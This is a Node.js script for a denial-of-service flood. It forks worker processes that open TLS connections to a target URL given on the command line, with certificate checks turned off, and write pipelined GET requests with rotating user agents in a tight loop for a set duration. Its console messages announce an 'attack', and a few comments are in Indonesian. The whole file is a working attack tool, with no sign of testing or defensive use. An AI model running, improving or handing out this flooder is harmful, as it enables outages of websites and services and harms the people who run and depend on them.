const cluster = require('cluster');
const os = require('os');
const tls = require('tls');
const { URL } = require('url');

if (process.argv.length < 6) {
    console.error("Usage: node script.js <url> <time> <rps> <threads>");
    process.exit(1);
}

const targetURL = process.argv[2];
const duration = parseInt(process.argv[3], 10);
const rps = parseInt(process.argv[4], 10);
const threads = parseInt(process.argv[5], 10);

if (cluster.isMaster) {
    console.log(`🚀 Starting attack on ${targetURL} for ${duration} seconds using ${threads} threads`);

    for (let i = 0; i < threads; i++) {
        const worker = cluster.fork();
        console.log(`🔥 Worker ${worker.process.pid} started`);
    }

    setTimeout(() => {
        console.log("✅ Attack completed.");
        process.exit(0);
    }, duration * 1000);

    cluster.on('exit', (worker, code, signal) => {
        console.log(`⚠ Worker ${worker.process.pid} exited with code ${code}`);
    });
} else {
    const target = new URL(targetURL);
    const startTime = Date.now();

    const userAgents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (Linux; Android 10; SM-G973F)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0)"
    ];

    function sendTLSRequest() {
        const options = {
            host: target.hostname,
            port: 443,
            servername: target.hostname,
            rejectUnauthorized: false
        };

        const client = tls.connect(options, () => {
            function flood() {
                if (Date.now() - startTime >= duration * 1000) {
                    console.log(`⏹ Worker ${process.pid} stopping attack.`);
                    process.exit(0);
                }

                const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
                const request = `GET ${target.pathname} HTTP/1.1\r\n` +
                                `Host: ${target.hostname}\r\n` +
                                `User-Agent: ${randomUA}\r\n` +
                                "Accept: */*\r\n" +
                                "Connection: keep-alive\r\n\r\n";

                for (let i = 0; i < rps; i++) {
                    client.write(request);
                }

                // Menggunakan setImmediate untuk eksekusi cepat tanpa membebani CPU
                setImmediate(flood);
            }
            flood();
        });

        client.on("error", () => {
            client.destroy();
        });

        client.on("close", () => {
            client.destroy();
        });
    }

    function attackLoop() {
        if (Date.now() - startTime >= duration * 1000) {
            console.log(`⏹ Worker ${process.pid} stopping attack.`);
            process.exit(0);
        }

        sendTLSRequest();
        // Menambahkan delay kecil agar CPU tetap stabil
        setImmediate(attackLoop);
    }

    attackLoop();
}
